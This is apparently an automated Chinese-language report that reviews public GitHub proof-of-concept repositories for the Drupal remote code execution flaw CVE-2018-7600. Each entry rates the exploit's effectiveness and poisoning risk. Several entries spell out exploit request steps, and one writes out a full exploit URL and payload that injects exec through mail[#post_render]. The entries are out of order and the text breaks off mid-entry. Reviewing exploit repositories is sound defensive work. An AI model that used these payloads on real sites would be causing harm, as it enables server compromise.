*   使用Web应用防火墙（WAF）过滤恶意请求。

**项目地址:** [raytran54/CVE-2018-7600](https://github.com/raytran54/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #25

**来源**: [CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md](../2018/CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且使用默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求，将恶意代码注入到系统，从而实现远程代码执行。

**有效性：**

根据漏洞库信息、搜索引擎结果以及大量的公开利用代码来看，该漏洞的利用具有很高的有效性。 搜索结果中，许多文章都讨论了该漏洞的利用方法，Metasploit中也有相应的利用模块，Exploit-DB上也有相关的exploit。

**投毒风险：**

提供的漏洞利用代码仅包含GNU GPL许可协议，没有发现直接的恶意代码。但是，任何从不可信来源获取的代码都存在潜在的投毒风险。即使代码本身看起来无害，也可能存在细微的缺陷或依赖关系，这些缺陷或依赖关系可能会被恶意利用。因此，对下载的POC代码进行代码审计是必要的。

考虑到仅仅是LICENSE文件，投毒概率极低，仅为5%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **发送恶意请求：** 攻击者构造包含恶意代码的特殊请求，该请求通常通过URL参数或POST数据发送。
2.  **利用漏洞：** Drupal在处理该请求时，由于输入验证不足，会将恶意代码传递给PHP的`exec()`或类似函数执行。
3.  **执行任意代码：** 恶意代码在服务器上执行，攻击者可以控制服务器，例如安装后门、窃取数据等。

攻击者可以利用该漏洞执行任意系统命令，从而完全控制受影响的Drupal服务器。该漏洞影响多个Drupal版本，因此影响范围非常广泛。

**项目地址:** [ruthvikvegunta/Drupalgeddon2](https://github.com/ruthvikvegunta/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #26

**来源**: [CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md](../2018/CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于多个子系统存在输入验证不足的问题，允许远程攻击者执行任意代码。

**有效性：**
提供的POC代码（Drupal-RCE-Mass-Exploiter.py）针对Drupal 7和Drupal 8的不同利用方式。对于Drupal 7，它利用`user/password`表单的`#post_render`属性和`file/ajax`端点。对于Drupal 8，它利用`user/register`表单的`timezone`字段。

根据漏洞库信息和搜索引擎结果，此漏洞利用代码是有效的，多个Exploit-DB条目 (44482, 44448, 44449)和安全博客(Rapid7, Palo Alto Networks, Tenable等)确认了其存在和严重性，并且在实际环境中被广泛利用。

**投毒风险：**
此脚本本身主要功能是批量检测和利用漏洞，但仍存在潜在的投毒风险：

*   **命令执行：** 脚本允许通过`COMMAND`变量指定要执行的命令，如果攻击者修改了脚本并分享给他人，可能会将`COMMAND`设置为恶意代码。
*   **后门植入：** 虽然未直接观察到后门代码，但如果恶意用户分发修改后的版本，它们可能会添加后门植入代码，例如添加管理员账户或修改核心文件。
*   **代理风险：** 脚本支持使用代理，恶意代理服务器可能会窃取受害者服务器的敏感信息。

总体来说，脚本的投毒风险较低，约为10%，因为其主要功能是漏洞利用，但使用前仍需仔细审查代码。

**利用方式：**

1.  **Drupal 7:**
    *   利用`user/password`表单中的`name[#post_render]`属性执行命令。攻击者构造一个包含恶意PHP代码的请求，该代码将在服务器上执行。
    *   使用`file/ajax`端点来触发命令执行。
2.  **Drupal 8:**
    *   利用`user/register`表单中的`timezone`字段和`#post_render`属性执行命令。
    *   构造包含恶意PHP代码的AJAX请求，并在服务器端执行。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，影响多个Drupal版本。提供的POC代码是有效的，但使用前需要仔细审查，以避免潜在的投毒风险。攻击者可以利用此漏洞获取服务器的完全控制权。

**项目地址:** [shellord/CVE-2018-7600-Drupal-RCE](https://github.com/shellord/CVE-2018-7600-Drupal-RCE)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #27

**来源**: [CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md](../2018/CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md)

## CVE-2018-7600 - Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标系统运行存在漏洞的Drupal版本，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，允许攻击者在服务器上执行任意代码。

**有效性:**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性很高。漏洞库信息明确指出该漏洞允许远程代码执行，搜索结果表明存在大量针对该漏洞的利用尝试，并且已经有公开的Exploit-DB条目。提供的Python代码 `mass.py` 实现了对Drupal 7 和 Drupal 8的批量漏洞利用，进一步证明了漏洞的可利用性。

**投毒风险:**
分析提供的`mass.py`代码，发现该代码主要功能是批量检测和利用Drupal的CVE-2018-7600和CVE-2018-7602漏洞。代码结构清晰，包含漏洞检测和利用的核心逻辑，没有明显的恶意或隐藏功能。但是,批量漏洞利用脚本本身如果被恶意使用，例如，大规模扫描和攻击未经授权的系统，也存在一定的潜在风险。 `README.md` 文件描述了脚本的用法，包括指定目标列表、输出文件、worker数量和代理等，以及要利用的漏洞编号。
代码中存在使用eval或者其他类似的高危函数的情况，攻击者可能会篡改`COMMAND`变量来执行恶意操作。这种潜在的风险主要来自于用户的不当使用或者受到攻击者恶意篡改的情况，而不是代码作者有意植入后门。

**利用方式:**
1.  **Drupal 7:**
    *   利用 `user/password` 路径，通过构造特定的GET和POST参数，触发`passthru`函数执行命令。
    *   首先发送包含恶意payload的POST请求到 `user/password`，触发 Drupal 的渲染过程。
    *   然后从返回的 HTML 中提取 `form_build_id`。
    *   最后再次发送包含`form_build_id`的POST请求到 `file/ajax/name/#value/{form_build_id}`，从而执行恶意代码。
2.  **Drupal 8:**
    *   利用 `user/register` 路径，通过构造特定的GET和POST参数，触发`exec`函数执行命令。
    *   构造包含恶意payload的POST请求到 `/user/register`。
漏洞利用依赖于未打补丁的Drupal版本中存在的输入验证漏洞，攻击者可以利用这些漏洞执行任意PHP代码，从而完全控制受影响的系统。

**项目地址:** [shellord/Drupalgeddon-Mass-Exploiter](https://github.com/shellord/Drupalgeddon-Mass-Exploiter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #28

**来源**: [CVE-2018-7600-soch4n_CVE-2018-7600.md](../2018/CVE-2018-7600-soch4n_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在服务器上执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且使用了默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个影响Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时存在缺陷，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。PoC代码利用了`user/register`接口的Ajax功能，通过`element_parents`参数注入恶意代码。攻击者通过操纵`mail[\"a\"][#lazy_builder][0]`和`mail[\"a\"][#lazy_builder][1][]`参数，将`system`函数和`ls -la`命令注入到Drupal的渲染过程中，从而执行系统命令。提供的代码没有明显的投毒迹象，它是一个直接的漏洞利用程序，旨在展示漏洞的存在并执行任意命令。 多个来源证实该漏洞影响了大量Drupal站点，并导致大规模攻击。

**项目地址:** [soch4n/CVE-2018-7600](https://github.com/soch4n/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #29

**来源**: [CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md](../2018/CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码，完全控制受影响的Drupal站点。

**影响版本:** Drupal 7.x (< 7.58), 8.x (< 8.3.9), 8.4.x (< 8.4.6), and 8.5.x (< 8.5.1)

**利用条件:** 目标Drupal站点必须是受影响的版本，且没有应用相应的安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的攻击者执行任意代码。漏洞利用代码展示了使用Metasploit的drupalgeddon2模块进行攻击的流程。 

**有效性：**
提供的POC代码基于Metasploit的`drupalgeddon2`模块，该模块是公开可用的，并且被广泛用于验证和利用此漏洞。因此，POC代码的**有效性很高**，如果目标满足漏洞利用条件，则能够成功执行。

**投毒风险：**
查看提供的漏洞利用代码，该代码主要是安装和配置Drupal 7.57以及使用Metasploit模块进行渗透测试的步骤。它还包含启用 ModSecurity 作为 WAF 的操作，并测试其防御能力，然后尝试使用 Metasploit 进行攻击。最后，展示了即使有WAF存在，攻击也失败了，没有打开 Meterpreter 会话。

虽然代码的本意是演示漏洞利用与防御，但依然存在极小的投毒风险：

*   环境配置脚本中，如果作者在安装包下载链接上做了手脚，替换成了恶意版本，存在投毒的可能性。但这部分可以通过校验安装包的HASH值来规避。
*   在ModSecurity规则配置中，如果包含了恶意的排除规则，则可能降低WAF的防御能力。然而，提供的配置看起来相对标准。考虑到该项目主要关注漏洞利用演示，而并非恶意软件分发，**投毒风险较低，估计在5%左右。**

**利用方式：**
1.  攻击者识别出运行着未修补的Drupal版本的站点。
2.  攻击者构造恶意请求，通常涉及`q`参数（Drupal的路径处理机制）。
3.  恶意请求利用了Drupal的某些组件对用户输入验证不足的缺陷。
4.  恶意请求导致在服务器上执行任意PHP代码，从而实现远程代码执行。
5.  可以使用Metasploit的`drupalgeddon2`模块自动化漏洞利用过程，或者手动构造payload。

**总结：**
CVE-2018-7600是一个严重的远程代码执行漏洞，利用方式相对简单，且有公开的Metasploit模块可用。尽管代码本身演示了漏洞利用和防御，但仍需警惕潜在的投毒风险。强烈建议受影响的Drupal站点尽快升级到安全版本。

**项目地址:** [tea-celikik/Drupal-Exploit-Lab](https://github.com/tea-celikik/Drupal-Exploit-Lab)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #30

**来源**: [CVE-2018-7600-thehappydinoa_CVE-2018-7600.md](../2018/CVE-2018-7600-thehappydinoa_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时存在缺陷，允许未经身份验证的攻击者通过构造特殊的请求来执行任意代码。

**有效性分析：**

*   漏洞库信息和搜索引擎结果均表明该漏洞是一个严重的安全问题，影响多个Drupal版本，并允许远程代码执行。
*   提供的POC代码尝试通过`drupal_ajax`接口注册用户，并利用`exec` markup执行bash命令。POC会执行`id`命令，并将结果写入一个随机名称的文件中，然后尝试通过HTTP访问该文件以验证漏洞利用是否成功。成功后，会尝试删除该文件。
*   多个Exploit-DB链接（如44448, 44449, 44482）表明存在公开可用的漏洞利用代码。

综合来看，提供的POC代码是有效的，可以用来验证目标Drupal站点是否存在CVE-2018-7600漏洞。

**投毒风险分析：**

*   POC代码本身主要功能是执行命令并将结果写入文件，之后验证文件是否可访问，以验证漏洞存在性。这种模式本身存在潜在的投毒风险，攻击者可以将恶意代码注入到被写入的文件中，或者修改POC使其执行更具破坏性的操作。
*   代码中`random_file_name`变量虽然使用了随机文件名，但如果被成功利用，攻击者可以精确控制写入内容和删除操作，因此存在恶意利用的可能性。
*   `download_command` 和 `rm_command` 如果被篡改，可能导致下载恶意文件或删除重要文件，因此也有潜在风险。
*   `tor_proxy`选项的存在意味着该POC可能被用于隐藏攻击者的真实IP地址，这增加了追踪和溯源的难度。
*   综合代码，投毒风险评估为10%。主要是因为POC的主要目的是验证漏洞，而大规模恶意利用需要在代码层面进行显著修改。

**利用方式分析：**

1.  **构造恶意请求：** 攻击者发送包含恶意代码的特殊构造的HTTP请求到Drupal站点。
2.  **利用`drupal_ajax`接口：** POC利用Drupal的`drupal_ajax`接口来触发漏洞。
3.  **远程代码执行：** 恶意代码通过Drupal的输入处理缺陷被执行，导致远程代码执行。
4.  **验证与清理（POC）：** POC验证代码执行成功后，会尝试清理现场（删除创建的文件）。实际攻击中，攻击者可能会执行更具破坏性的操作，例如安装后门、窃取数据或篡改网站内容。

**项目地址:** [thehappydinoa/CVE-2018-7600](https://github.com/thehappydinoa/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #31

**来源**: [CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md](../2018/CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制受影响的 Drupal 站点

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞源于 Drupal 在处理用户提供的输入时，没有进行充分的验证，攻击者可以通过精心构造的恶意请求，在服务器上执行任意代码。 

**有效性分析：**
根据漏洞库信息和搜索结果，该漏洞是一个经过验证的远程代码执行漏洞，并且存在公开可用的利用代码。大量的安全厂商和研究人员对此漏洞进行了分析和验证，证明其有效性。 

**投毒风险分析：**
提供的Python代码是一个网络数据包捕获脚本，主要用于分析网络流量，特别是HTTP流量，并检测其中是否存在CVE-2018-7600漏洞的利用尝试。 

*   **功能：** 该脚本使用 `pyshark` 库捕获网络接口上的数据包，并分析HTTP请求的URI和POST数据。它查找包含特定关键字（如`exec`, `passthru`, `system`等）的请求，这些关键字通常与远程代码执行攻击相关。  该脚本主要用于检测已知的攻击模式，而不是发起攻击。

*   **潜在投毒风险：** 虽然该脚本本身主要是用于流量分析，但仍然存在一些潜在的风险：
    *   **性能影响：** 在高流量环境下，该脚本可能会消耗大量的CPU和内存资源，导致系统性能下降。 这种消耗如果被恶意利用，可以作为一种拒绝服务攻击。
    *   **数据泄露：** 该脚本会捕获网络数据包，其中可能包含敏感信息，例如用户名、密码、API密钥等。 如果脚本的输出被不当存储或泄露，可能会导致数据泄露。
    *   **依赖风险：** `pyshark` 依赖 `tshark`，如果 `tshark` 本身存在安全漏洞，可能会影响该脚本的安全性。
    *  **后门代码：**代码中没有明显的恶意后门代码，但捕获流量到`csv`文件中可能导致信息泄露，如果该文件可以被外部访问，或者被攻击者替换，则存在风险。

**利用方式：**
根据搜索结果和漏洞描述，攻击者可以通过以下方式利用该漏洞：

1.  发送包含恶意代码的特制HTTP请求，恶意代码通常会嵌入到URL参数或POST数据中。
2.  Drupal 的某些子系统（例如节点创建、用户注册等）在处理这些请求时，由于输入验证不足，会将恶意代码传递给PHP的 `eval()` 函数或其他类似函数执行，从而导致远程代码执行。
3.  攻击者可以利用执行的代码在服务器上安装后门、窃取数据或执行其他恶意操作。

综上，该漏洞利用的有效性很高，但提供的POC代码本身更多是流量分析工具，直接投毒风险较低(5%), 但需要注意潜在的性能影响、数据泄露和依赖风险。攻击者主要通过构造恶意 HTTP 请求来触发漏洞。

**项目地址:** [vphnguyen/ANM_CVE-2018-7600](https://github.com/vphnguyen/ANM_CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #32

**来源**: [CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md](../2018/CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal 7.x (before 7.58), 8.x (before 8.3.9), 8.4.x (before 8.4.6), and 8.5.x (before 8.5.1)

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见模块配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞信息和搜索结果，此漏洞影响多个子系统，利用方式是通过构造特殊的请求，特别是利用`user/password` endpoint，结合`#post_render`属性，触发PHP的`passthru()`函数来执行任意命令。

**有效性：**

提供的PoC代码通过两个步骤利用该漏洞：

1.  发送一个包含恶意参数的POST请求到`user/password`，利用`name[#post_render][]`，`name[#markup]`和`name[#type]`参数注入命令。
2.  从响应中提取`form_build_id`，然后发送另一个包含该`form_build_id`的请求到`file/ajax/name/#value/{form_build_id}`，以触发命令执行。

根据提供的漏洞库信息、搜索结果以及利用代码，可以判断此POC代码是**有效**的，可以利用未修复的Drupal站点执行远程代码。

**投毒风险：**

评估PoC代码是否存在投毒风险：

*   代码相对简短，易于审查。
*   代码的主要功能是利用已知的Drupal漏洞执行命令，没有发现明显的恶意行为。
*   虽然代码中没有直接发现投毒代码，但是任何代码都存在被恶意修改的风险。例如，攻击者可能会修改命令执行部分，使其在执行用户指定的命令之前或之后执行其他恶意操作。

尽管直接投毒证据不多，但考虑到软件供应链的安全风险，以及任何代码都可能被篡改的可能性，综合评估投毒风险为**5%**。这个评估考虑了代码本身的简洁性以及潜在的供应链攻击风险。

**利用方式：**

1.  攻击者首先构造一个包含恶意参数的POST请求，发送到目标Drupal站点的`user/password`路径。
2.  该请求利用了Drupal的表单渲染机制中的漏洞，允许攻击者注入并执行PHP代码。
3.  服务器响应包含一个`form_build_id`，攻击者需要提取该ID。
4.  攻击者使用提取的`form_build_id`构造第二个POST请求，发送到`file/ajax/name/#value/{form_build_id}`路径。
5.  这个请求触发Drupal执行之前注入的PHP代码，从而实现远程代码执行。

通过这种方式，攻击者可以在未经身份验证的情况下，在目标Drupal服务器上执行任意命令，从而完全控制受影响的系统。

**项目地址:** [xxxTectationxxx/CVE-2018-7600](https://github.com/xxxTectationxxx/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #33

**来源**: [CVE-2018-7600-ynsmroztas_drupalhunter.md](../2018/CVE-2018-7600-ynsmroztas_drupalhunter.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且网络可达

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个子系统，常见模块配置也可能受到影响。大量Drupal网站受到影响。 

**有效性：**

提供的Python POC代码利用了Drupal的多个漏洞组合来实现远程代码执行。它通过构造特定的请求参数，包括`q`、`name[#post_render][]`、`name[#markup]`和`name[#type]`，以及提交`form_id`和`_triggering_element_name`来触发漏洞。然后，它解析响应以获取`form_build_id`，并使用它来发送另一个请求以执行任意命令。 搜索引擎结果中的多个条目表明该漏洞被广泛利用。

**投毒风险：**

虽然POC代码本身是为了演示漏洞利用而编写的，但存在一定的投毒风险。  如果攻击者修改了POC代码，例如，将command参数修改成下载恶意脚本并执行，那么该POC可以被用来传播恶意软件。 由于代码逻辑相对简单，作者在其中隐藏复杂后门的可能性较低。但是，无法完全排除，所以投毒风险定为10%。

**利用方式：**

1.  攻击者首先构造包含恶意参数的POST请求到目标Drupal站点的`/user/password`路径。
2.  恶意参数包括`q`设置为`user/password`，以及使用`name[#post_render][]`，`name[#markup]`和`name[#type]`来注入要执行的操作系统命令。
3.  服务器响应包含`form_build_id`。
4.  攻击者使用`form_build_id`构造另一个POST请求到`/file/ajax/name/#value/{form_build_id}`，执行先前注入的命令。
5.  命令执行的结果将返回给攻击者。

**项目地址:** [ynsmroztas/drupalhunter](https://github.com/ynsmroztas/drupalhunter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #34

**来源**: [CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md](../2018/CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站启用了默认或常见模块配置，且未打补丁

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求参数，在服务器上执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞利用的有效性很高。漏洞库和搜索引擎结果均表明该漏洞是真实的，且存在公开可用的漏洞利用代码。提供的POC代码 `cve-2018-7600_cmd.py`  能够成功利用该漏洞在目标Drupal服务器上执行任意命令。

**投毒风险：**

仔细审查提供的POC代码 `cve-2018-7600_cmd.py`，初步判断投毒风险较低。代码逻辑较为清晰，主要功能是构造恶意请求，利用Drupal的漏洞执行命令。其中`/exphub.txt`是漏洞利用后留下的命令执行记录，方便查看命令执行情况。

需要注意的是，任何公开的漏洞利用代码都存在被修改和二次发布的风险，攻击者可能在其中添加恶意代码。因此，在使用任何漏洞利用代码前，都应该进行仔细审查，并确保来源可靠。但此仓库只有两个文件且内容较少,投毒风险评估为5%。

**利用方式：**

该漏洞的利用方式主要包括以下步骤：

1.  **确定目标Drupal网站版本：** 攻击者需要确定目标Drupal网站的版本是否在漏洞影响范围内。
2.  **构造恶意请求：** 攻击者需要构造包含恶意代码的请求，其中恶意代码将通过`mail[#markup]`传递给`exec`函数执行。请求的URL为`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`，请求方式为POST，并包含特定的payload，例如`{'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': ''+cmd+' | tee exphub.txt'}`。
3.  **发送恶意请求：** 攻击者将构造的恶意请求发送给目标Drupal网站。
4.  **执行任意代码：** 如果目标Drupal网站存在漏洞，恶意请求中的代码将被执行，攻击者从而获得服务器的控制权。

此漏洞是一个典型的输入验证漏洞，攻击者通过精心构造的输入，绕过了Drupal的安全检查，最终导致远程代码执行。

**项目地址:** [zhzyker/CVE-2018-7600-Drupal-POC-EXP](https://github.com/zhzyker/CVE-2018-7600-Drupal-POC-EXP)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---



---

## POC #2

**来源**: [CVE-2018-7600-Damian972_drupalgeddon-2.md](../2018/CVE-2018-7600-Damian972_drupalgeddon-2.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且配置允许远程访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal的远程代码执行漏洞。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以得出以下结论：

**有效性：**

提供的POC代码是有效的漏洞检测脚本。它通过构造特定的URL和POST请求，利用Drupal中的输入验证漏洞，尝试执行任意命令。脚本会检测目标站点是否返回预期的“GOOD”字符串，以判断漏洞是否存在。

**投毒风险：**

该漏洞利用代码主要由一个PHP脚本组成，用于检测Drupal站点是否存在CVE-2018-7600漏洞。脚本的逻辑相对简单，主要功能是发送特定的HTTP请求并检查响应。主要的风险可能存在于以下几个方面：

1.  **命令执行：** 虽然脚本的目的是检测漏洞，但它确实会尝试在目标服务器上执行命令。如果脚本被恶意修改，攻击者可以更改`$command`变量，从而执行任意的恶意命令。
2.  **信息泄露：** 脚本会发送包含特定参数的HTTP请求，这些参数可能会泄露目标站点的信息。
3.  **拒绝服务（DoS）：** 如果脚本被大规模使用，可能会对目标服务器造成一定的负载，导致拒绝服务。

考虑到以上因素，认为此仓库中存在作者隐藏的投毒代码的可能性较低，约为5%。这个假设的依据是代码相对简单，容易审查，并且其主要目的是漏洞检测而非利用。

**利用方式：**

1.  **构造恶意请求：** 攻击者构造包含恶意代码的URL或POST请求，利用Drupal的多个子系统中的输入验证漏洞。
2.  **远程代码执行：** 恶意代码通过Drupal的渲染机制执行，导致远程代码执行。

具体来说，对于Drupal 7.x，POC利用`user/password`路径，通过`name[#post_render]`、`name[#type]`和`name[#markup]`参数注入PHP代码。对于Drupal 8.x，POC利用`user/register`路径，通过`element_parents`、`mail[a][#post_render]`、`mail[a][#type]`和`mail[a][#markup]`参数注入PHP代码。这些参数允许在特定情况下执行PHP代码，从而实现远程代码执行。

**总结：**

CVE-2018-7600是一个严重的安全漏洞，允许未经身份验证的攻击者在Drupal站点上执行任意代码。提供的POC代码可以有效地检测该漏洞，但使用时需要注意潜在的风险，以避免对目标系统造成损害。务必确保从可信来源获取利用代码，并在受控环境中进行测试。


**项目地址:** [Damian972/drupalgeddon-2](https://github.com/Damian972/drupalgeddon-2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #3

**来源**: [CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md](../2018/CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站允许未授权用户访问用户注册页面或其他类似的form API接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon 2) 允许未经身份验证的远程攻击者在受影响的Drupal网站上执行任意代码。漏洞存在于 Drupal 的 Form API 中，通过构造特定的POST请求，可以绕过输入验证，导致代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以确认此漏洞利用是有效的。大量资料表明该漏洞已被广泛利用。

**投毒风险：**
分析提供的文件，包括`README.md`, `README.zh-cn.md`, 和 `docker-compose.yml`。这些文件主要包含漏洞描述、环境搭建说明和POC使用方法。`docker-compose.yml` 文件指定了使用 `vulhub/drupal:8.5.0` 镜像，这个镜像本身如果存在后门，可能导致投毒。此外，虽然直接的恶意代码在提供的文件中未发现，但由于攻击者能够执行任意代码，意味着他们完全有可能在目标系统上植入后门或其他恶意程序。

因此，该仓库本身直接包含投毒代码的可能性较低，但通过漏洞利用植入后门的可能性非常高，综合判断投毒风险为10%。

**利用方式：**
